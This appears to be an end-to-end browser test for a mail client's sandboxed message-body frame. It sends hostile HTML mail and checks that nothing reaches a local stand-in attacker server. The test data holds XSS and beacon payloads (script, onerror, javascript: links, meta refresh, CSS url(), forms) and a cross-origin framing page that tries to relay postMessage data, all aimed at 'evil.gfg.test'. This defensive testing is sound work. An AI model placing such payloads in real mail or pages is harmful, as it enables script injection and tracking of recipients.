// needs: hub mail roof-mail
// Mail's body boundary in a browser (One roof stage 4, s4/spec §3, §7, §10.2; RB1, RB2, RB3, RI10). Mail's own worker
// registered first, as a phone that has opened Mail has it. Part A (MB's own): a page at the hub's address,
// http://ifl.test:8788/, frames Mail's shell at email.ifl.test:8788/body/ with the module's own parent half
// (email/public/roof/bodyframe.js, loaded from the inflite repo beside), exactly as §3.2 builds it, with hostile mail:
// no script runs; nothing reaches the attacker's host until Load, then only for that message; the page can't read a
// frame's document; a forged message changes nothing; heights follow the quotes; a wide newsletter is shrunk; a text
// body is linked and folded; a page at another address can't frame the shell; Mail's worker never keeps or answers a
// frame, online or off. Part B (after MM, MR and MT): the same through the reader at /mail/; it says "part B skipped"
// while the reader is still B0's stub.
import http from 'node:http';
import { randomBytes } from 'node:crypto';
import { readFileSync, existsSync } from 'node:fs';
import { kit } from './lib.mjs';
import { makeAccount, PASSWORD } from './join.mjs';

const [,, S, out] = process.argv;
const K = await kit(S, out);
const { ok, one, hubPhone, hostAsk, HUB, errs } = K;
const MAIL = 'http://email.ifl.test:8788', ACCT = 'http://account.ifl.test:8788';
const ROOFDIR = new URL('../../../inflite/email/public/roof/', import.meta.url);
const wait = (ms) => new Promise((r) => setTimeout(r, ms));

// ---- the attacker's host: every connection and request it gets ----
const EVIL_PORT = 8899, EVIL = `http://evil.gfg.test:${EVIL_PORT}`;
const evil = { conns: 0, hits: [] };
const evilServer = http.createServer((q, r) => {
  evil.hits.push(q.url);
  if (q.url === '/framer') { r.writeHead(200, { 'Content-Type': 'text/html' }); r.end(`<!doctype html><script>addEventListener('message', (e) => fetch('/heard?' + encodeURIComponent(JSON.stringify(e.data))));</script><iframe src="${MAIL}/body/#m=x&t=light&img=0&p=${encodeURIComponent(EVIL)}"></iframe>`); return; }
  r.writeHead(200, { 'Content-Type': 'image/png' }); r.end();
});
evilServer.on('connection', () => evil.conns++);
await new Promise((r) => evilServer.listen(EVIL_PORT, '127.0.0.1', r));
const evilSince = (n) => evil.hits.slice(n);

// ---- George, the site's admin, signed in ----
const george = await hubPhone('george', await K.makeKeys());
const { p, ctx } = george;
await makeAccount(p, `${ACCT}/`, { name: 'George Farrow-Green', handle: 'georgebody', email: 'george@example.com', password: PASSWORD });
const gid = one("SELECT id FROM pg_users WHERE handle = 'georgebody'")[0]?.id;
one(`INSERT OR REPLACE INTO pg_meta (k, v) VALUES ('admin_user', '${gid}')`);
one(`INSERT OR IGNORE INTO pg_passkeys (id, user_id, public_key, alg, created_at) VALUES ('mailbody-key', '${gid}', 'x', -7, ${Date.now()})`);
ok(!!gid, 'George’s account, the site’s admin with a passkey');

// (a message to Mail, through Mail's Worker's own email handler)
function deliver(subject, body, type = 'text/html') {
  const raw = ['From: Rowan Ash <rowan@example.com>', 'To: hello@inflite.ai', `Subject: ${subject}`, `Message-ID: <${randomBytes(8).toString('hex')}@example.com>`,
    `Date: ${new Date().toUTCString()}`, 'MIME-Version: 1.0', `Content-Type: ${type}; charset=utf-8`, '', body, ''].join('\r\n');
  return new Promise((done) => {
    const q = http.request({ host: '127.0.0.1', port: 8806, method: 'POST', agent: false, path: '/cdn-cgi/handler/email?from=rowan%40example.com&to=hello%40inflite.ai',
      headers: { 'Content-Type': 'message/rfc822', 'Content-Length': Buffer.byteLength(raw) } }, (res) => { res.resume(); res.on('end', () => done(res.statusCode)); });
    q.on('error', () => done(0)); q.end(raw);
  });
}
const HOSTILE = `<p id="top">Hello from Rowan</p>
<script>try{parent.parent.__pwned=1}catch(e){}fetch('${EVIL}/script')</script>
<img src="x" onerror="fetch('${EVIL}/onerror')">
<a id="js" href="javascript:fetch('${EVIL}/js')">Tap me</a>
<meta http-equiv="refresh" content="0;url=${EVIL}/refresh">
<base href="${EVIL}/base/">
<link rel="preconnect" href="${EVIL}"><link rel="stylesheet" href="${EVIL}/sheet.css"><link rel="prefetch" href="${EVIL}/prefetch">
<form action="${EVIL}/form" method="get"><input name="q" value="x"><button id="sub">Go</button></form>
<div style="background:url(${EVIL}/cssurl.png)">A picture behind</div>
<img id="pic" src="${EVIL}/pic.png" width="10" height="10">
<p><a id="mt" href="mailto:pat@example.com?subject=Hello%20Pat">Write to Pat</a> or <a id="web" href="${EVIL}/link">a link</a></p>`;
const OTHER = `<p>Another message</p><img src="${EVIL}/other.png">`;
const WIDE = `<table width="5000" bgcolor="#ffffff"><tr><td>A very wide newsletter: ${'word '.repeat(400)}</td></tr></table>`;
const QUOTE = `<p>Yes, Thursday works.</p><p>On Mon, 3 Nov 2026 at 14:02, Pat &lt;pat@example.com&gt; wrote:</p><blockquote type="cite">${Array.from({ length: 60 }, (_, i) => `<p>Old line ${i + 1}</p>`).join('')}</blockquote>`;
const TEXT = `See https://example.com/plan and write to pat@example.com.\n\nOn Mon, Pat wrote:\n> the old words\n> more old words`;
const sent = [];
for (const [subject, body, type] of [['Hostile', HOSTILE], ['Other', OTHER], ['Wide', WIDE], ['Quoted', QUOTE], ['Plain', TEXT, 'text/plain']]) sent.push(await deliver(subject, body, type));
ok(sent.every((s) => s >= 200 && s < 300), 'five messages come to Mail', sent.join());

// ---- Mail's own worker, registered first (as on a phone that has opened Mail) ----
const mailPage = await ctx.newPage();
await mailPage.goto(`${MAIL}/`);
const reg = await mailPage.evaluate(async () => { const r = await navigator.serviceWorker.register('/sw.js'); await navigator.serviceWorker.ready; return !!r.active || !!navigator.serviceWorker.controller || true; }).catch((e) => String(e));
await wait(1500);
const ids = await mailPage.evaluate(async () => {
  const lists = await Promise.all(['', '?view=people', '?view=updates'].map((q) => fetch(`/api/threads${q}`, { credentials: 'same-origin' }).then((r) => r.json()).catch(() => null)));
  const out = {};
  for (const t of lists.flatMap((l) => l?.threads || [])) {
    const th = await (await fetch(`/api/threads/${t.id}`, { credentials: 'same-origin' })).json();
    for (const m of th.messages || []) out[m.subject] = { id: m.id, threadId: m.threadId };
  }
  return out;
});
ok(reg === true && ['Hostile', 'Other', 'Wide', 'Quoted', 'Plain'].every((s) => ids[s]?.id), 'Mail’s worker registered at Mail’s address, and the messages’ ids', JSON.stringify({ reg, ids }));
const keptPage = async () => mailPage.evaluate(async () => { const c = await caches.open('mail-app-2'); const r = await c.match('/'); return r ? (await r.text()).slice(0, 4000) : null; }).catch(() => null);

// ---- Part A: a page at the hub's address, framing the shell through the module's own bodyframe.js ----
const TEST = `${HUB}/__bodytest`;
await ctx.route(`${HUB}/__roof/**`, (r) => {
  const f = new URL(r.request().url()).pathname.slice('/__roof/'.length);
  const file = new URL(f, ROOFDIR);
  if (!/^[\w.-]+\.js$/.test(f) || !existsSync(file)) return r.fulfill({ status: 404, body: '' });
  return r.fulfill({ status: 200, contentType: 'text/javascript', body: readFileSync(file) });
});
await ctx.route(TEST, (r) => r.fulfill({ status: 200, contentType: 'text/html', body: `<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Body test</title>
<style>body{margin:0;font:16px system-ui}iframe.mail-body{display:block;width:100%;border:0}.cover{color:red}</style></head><body><main id="list"></main>
<script type="module">
import * as BF from "/__roof/bodyframe.js";
window.BF = BF;
window.said = { remote: [], mailto: [], touched: [] };
window.frames_ = {};
window.off = BF.listenFrames({ remote: (id, on) => said.remote.push([id, on]), mailto: (h) => said.mailto.push(h), touched: (id) => said.touched.push(id) });
window.add = (key, msg, opts) => { const f = BF.bodyFrame(msg, opts); frames_[key] = f; document.getElementById("list").append(f.el); return f.el.src; };
window.ready = true;
</script></body></html>` }));
const pageErrs0 = errs.length;
await p.goto(TEST);
await p.waitForFunction(() => window.ready === true, null, { timeout: 15000 });
const msg = (s) => ({ id: ids[s].id, threadId: ids[s].threadId, from: { name: 'Rowan Ash', email: 'rowan@example.com' } });
const evil0 = evil.hits.length, conns0 = evil.conns;
const srcs = {};
for (const s of ['Hostile', 'Other', 'Wide', 'Quoted', 'Plain']) srcs[s] = await p.evaluate(([k, m, eager]) => window.add(k, m, { theme: 'light', eager }), [s, msg(s), s === 'Hostile']);
ok(srcs.Hostile === `${MAIL}/body/#m=${ids.Hostile.id}&t=light&img=0&p=${encodeURIComponent(HUB)}`, 'the frame’s address: Mail’s shell, the message, the theme, no pictures, the parent', srcs.Hostile);
const heights = async () => p.evaluate(() => Object.fromEntries(Object.entries(frames_).map(([k, f]) => [k, Number(f.el.getAttribute('height'))])));
const heard = async (keys) => { for (let i = 0; i < 60; i++) { const h = await heights(); if (keys.every((k) => h[k] !== 120)) return h; await wait(250); } return heights(); };
const h1 = await heard(['Hostile', 'Other', 'Wide', 'Quoted', 'Plain']);
ok(Object.values(h1).every((h) => h >= 40 && h !== 120), 'every frame said its height', JSON.stringify(h1));
await p.screenshot({ path: `${out}/frames.png`, fullPage: true });

// (the shell drew the message: its inner frame, from the shell's own document, as Playwright can see it)
const shellOf = (s) => p.frames().find((f) => f.url().startsWith(`${MAIL}/body/`) && f.url().includes(`m=${ids[s].id}`));
const innerOf = (s) => shellOf(s)?.childFrames()[0];
const look = await innerOf('Hostile')?.evaluate(() => ({ top: document.getElementById('top')?.textContent, scripts: document.scripts.length, metas: document.querySelectorAll('meta[http-equiv=refresh], link, base[href]').length,
  base: document.querySelector('base')?.getAttribute('target'), csp: document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content })).catch((e) => String(e));
ok(look?.top === 'Hello from Rowan' && look.scripts === 0 && look.metas === 0 && look.base === '_blank' && look.csp === "default-src 'none'; img-src 'self' data:; style-src 'unsafe-inline'; font-src data:",
  'the hostile mail drawn in the shell’s inner frame: no script, no refresh, no link, no base of its own, the strict policy', JSON.stringify(look));
const sandbox = await shellOf('Hostile')?.evaluate(() => document.querySelector('iframe')?.getAttribute('sandbox')).catch(() => null);
ok(sandbox === 'allow-same-origin allow-popups allow-popups-to-escape-sandbox', 'the inner frame’s sandbox: never allow-scripts', sandbox);

// (the hub's page: no script of the mail ran here, and it can't read a frame's document)
const hub = await p.evaluate(() => ({ pwned: window.__pwned ?? null, docs: [...document.querySelectorAll('iframe.mail-body')].map((f) => f.contentDocument === null), url: location.href }));
ok(hub.pwned === null && hub.docs.length === 5 && hub.docs.every(Boolean) && hub.url === TEST, 'no script ran; every frame’s document is out of the page’s reach (contentDocument null); the page never moved', JSON.stringify(hub));
const said0 = await p.evaluate(() => window.said);
ok(JSON.stringify(said0.remote.filter(([id]) => id === ids.Hostile.id).at(-1)) === JSON.stringify([ids.Hostile.id, true]), 'the hostile mail’s remote pictures are reported as hidden (the module’s banner)', JSON.stringify(said0.remote));

// (taps inside: a javascript: link does nothing, the form doesn't send, the mailto: comes to the page as an address only)
const inner = innerOf('Hostile');
await inner?.click('#js').catch(() => {});
await inner?.click('#sub').catch(() => {});
await wait(1200);
await inner?.click('#mt').catch(() => {});
await wait(800);
const saidTap = await p.evaluate(() => window.said);
ok(JSON.stringify(saidTap.mailto) === JSON.stringify(['mailto:pat@example.com?subject=Hello%20Pat']), 'a mailto: link tapped: its address comes to the page, nothing else', JSON.stringify(saidTap.mailto));
ok(saidTap.touched.includes(ids.Hostile.id), 'touched: said to the page (its updater waits)', JSON.stringify(saidTap.touched));
await wait(1500);
ok(evilSince(evil0).length === 0 && evil.conns === conns0, 'nothing reached the attacker’s host: no script, no error handler, no javascript:, no refresh, no base, no preconnect or sheet, no form, no CSS url(), no picture', JSON.stringify({ hits: evilSince(evil0), conns: evil.conns - conns0 }));

// (Load: this message's pictures, and only this message's)
await p.evaluate(() => frames_.Hostile.allowImages());
for (let i = 0; i < 40 && !evilSince(evil0).length; i++) await wait(250);
await wait(1500);
const loaded = evilSince(evil0);
ok(loaded.length > 0 && loaded.every((u) => ['/pic.png', '/cssurl.png'].includes(u)), 'Load: the hostile mail’s pictures come, and only pictures (no script, link, form or refresh with them)', JSON.stringify(loaded));
ok(!loaded.includes('/other.png'), 'and only that message’s: the other message’s picture stays hidden', JSON.stringify(loaded));
const src2 = await p.evaluate(() => frames_.Hostile.el.src);
ok(src2.includes('&img=1&') && (await p.evaluate(() => frames_.Other.el.src)).includes('&img=0&'), 'Load: img=1 on that frame’s address alone', src2);

// (forged messages: from the page itself, from another frame at Mail's address, of another shape: nothing changes)
const before = await heights();
await p.evaluate((id) => { postMessage({ ifl: 'mailbody', v: 1, id, h: 999, remote: true, mailto: 'mailto:evil@example.com' }, '*'); }, ids.Quoted.id);
await p.evaluate(([m, id, hub]) => { const f = document.createElement('iframe'); f.name = 'rogue'; f.style.width = '200px'; f.src = `${m}/body/#m=${id}&t=light&img=0&p=${encodeURIComponent(hub)}`; document.body.append(f); }, [MAIL, ids.Quoted.id, HUB]);
await wait(3500);
const after = await heights();
const saidForged = await p.evaluate(() => window.said);
ok(after.Quoted === before.Quoted && !saidForged.mailto.includes('mailto:evil@example.com'), 'a forged message from the page, or a frame at Mail’s address the module didn’t make, changes nothing', JSON.stringify({ before: before.Quoted, after: after.Quoted }));
await p.evaluate(() => document.querySelector('iframe[name=rogue]')?.remove());

// (heights follow the quotes: folded short; shown, taller; a wide newsletter shrunk, on a white card)
const qBefore = (await heights()).Quoted;
await shellOf('Quoted')?.click('.quote-toggle').catch(() => {});
let qAfter = qBefore;
for (let i = 0; i < 20 && qAfter <= qBefore; i++) { await wait(250); qAfter = (await heights()).Quoted; }
ok(qAfter > qBefore + 300, 'Show Quoted Text: the frame grows to the quote, told to the page', `${qBefore} → ${qAfter}`);
await shellOf('Quoted')?.click('.quote-toggle').catch(() => {});
let qBack = qAfter;
for (let i = 0; i < 20 && qBack >= qAfter; i++) { await wait(250); qBack = (await heights()).Quoted; }
ok(qBack < qAfter, 'Hide Quoted Text: back down', `${qAfter} → ${qBack}`);
const wide = await innerOf('Wide')?.evaluate(() => ({ zoom: document.body.style.zoom, sw: document.documentElement.scrollWidth })).catch(() => null);
const wideCard = await p.evaluate(() => frames_.Wide.el.classList.contains('designed'));
ok(wide && Number(wide.zoom) > 0 && Number(wide.zoom) < 1 && wideCard, 'a 5000 px newsletter: shrunk to fit (zoom), on the white card', JSON.stringify({ wide, wideCard }));
const plain = await innerOf('Plain')?.evaluate(() => ({ link: document.querySelector('a[href="https://example.com/plan"]')?.target, mail: !!document.querySelector('a[href="mailto:pat@example.com"]'),
  quoted: getComputedStyle(document.querySelector('.quoted')).display })).catch(() => null);
ok(plain?.link === '_blank' && plain.mail && plain.quoted === 'none', 'a text body: linked, its quote folded, in the same inner frame', JSON.stringify(plain));

// (theme: posted to the frames, and they redraw dark)
await p.evaluate(() => window.BF.themeAll('dark'));
await wait(1200);
const dark = await innerOf('Plain')?.evaluate(() => getComputedStyle(document.body).color).catch(() => null);
ok(dark === 'rgb(245, 246, 251)', 'a theme change: the shell redraws in Mail’s dark colours', dark);

// (a page at another address can't frame the shell: frame-ancestors, and the shell answers no one else)
const q = await ctx.newPage();
const evil1 = evil.hits.length;
await q.goto(`${EVIL}/framer`);
await wait(3000);
ok(!evilSince(evil1).some((u) => u.startsWith('/heard')), 'a page at another address can’t frame the shell, and hears nothing from it', JSON.stringify(evilSince(evil1)));
await q.close();

// (Mail's own worker: Mail's kept page is still Mail's, never the shell; offline, a frame is the browser's error, never
// Mail's whole page, and no false "Couldn't show")
const kept = await keptPage();
ok(kept === null || (!/body\/body\.js/.test(kept) && /app\.js/.test(kept)), 'Mail’s worker kept Mail’s page, never a frame’s', kept?.slice(0, 120));
await ctx.setOffline(true);
await p.evaluate((m) => window.add('Offline', m, { theme: 'dark', eager: true }), msg('Other'));
await wait(7000);
const offFrame = p.frames().find((f) => f.url().includes(`m=${ids.Other.id}&t=dark`));
const offDrawn = offFrame ? await offFrame.evaluate(() => !!document.querySelector('script[src="/app.js"], .pane, #app')).catch(() => false) : false;
const offCover = await p.evaluate(() => !!frames_.Offline.el.nextElementSibling?.classList.contains('mail-body-cover'));
ok(!offDrawn && !offCover, 'offline: the frame is the browser’s error, not Mail’s whole page; and no “Couldn’t show” (the module’s offline state covers it)', JSON.stringify({ offDrawn, offCover }));
await ctx.setOffline(false);
const kept2 = await keptPage();
ok(kept2 === null || !/body\/body\.js/.test(kept2), 'and Mail’s kept page still Mail’s after', kept2?.slice(0, 80));
ok(errs.slice(pageErrs0).filter((e) => !/net::ERR_INTERNET_DISCONNECTED|Failed to fetch|Load failed/i.test(e)).length === 0, 'no error on the page', JSON.stringify(errs.slice(pageErrs0)));

// ---- Part B: through the reader at /mail/ (after MM, MR and MT are merged) ----
const readerStub = !existsSync(new URL('reader.js', ROOFDIR)) || /export const STUB = true/.test(readFileSync(new URL('reader.js', ROOFDIR), 'utf8'));
if (readerStub) console.log('part B skipped: reader is still a stub');
else {
  const H = await import('./roofhooks.mjs');
  const asked = [];
  p.on('request', (r) => { if (r.url().startsWith(`${MAIL}/api/`) && r.frame() === p.mainFrame()) asked.push(`${r.method()} ${new URL(r.url()).pathname}`); });
  await p.goto(`${HUB}/mail/#thread=${ids.Hostile.threadId}`);
  const frame = await p.waitForSelector(H.MAIL_BODY, { timeout: 30000 }).then(() => true, () => false);
  const b = frame ? await p.evaluate((sel) => { const f = document.querySelector(sel); return { src: f.src, doc: f.contentDocument === null, sandbox: f.getAttribute('sandbox') }; }, H.MAIL_BODY) : null;
  ok(b?.src.startsWith(`${MAIL}/body/#`) && b.doc && b.sandbox === 'allow-scripts allow-same-origin allow-popups allow-popups-to-escape-sandbox', 'B: the reader frames Mail’s shell', JSON.stringify(b));
  await wait(2500);
  ok(!asked.some((a) => /^GET \/api\/messages\/[\w-]+(\/raw)?$/.test(a)), 'B: the page never asked Mail for a body', JSON.stringify(asked));
  ok(p.url().startsWith(`${HUB}/mail/`), 'B: the page never navigated', p.url());
}

console.log('notes (page errors and console errors):', JSON.stringify(errs.slice(0, 8)));
evilServer.close();
await ctx.close();
await (await K.hubBrowser()).close();
await K.b.close();
console.log(`FAILS ${K.fails()}`);
process.exit(0);
